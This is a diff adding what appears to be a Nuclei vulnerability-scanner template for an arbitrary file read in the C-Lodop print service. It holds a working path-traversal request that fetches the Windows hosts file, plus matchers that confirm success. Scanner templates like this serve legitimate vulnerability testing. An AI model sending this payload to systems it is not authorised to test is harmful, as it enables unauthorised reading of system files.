@@ -1,0 +1,19 @@
+id: C-Lodop-anyfileread
+
+info:
+  name: C-Lodop-anyfileread
+  author: C-Lodop
+  severity: high
+
+http:
+  - raw:
+    - | 
+      GET /..././..././..././..././Windows/System32/drivers/etc/hosts HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: text/plain
+      Connection: close
+
+    matchers:
+      - type: dsl
+        dsl:
+         - status_code==200 && contains_all(body,"Microsoft Corp") && contains_all(body,"HOSTS file")
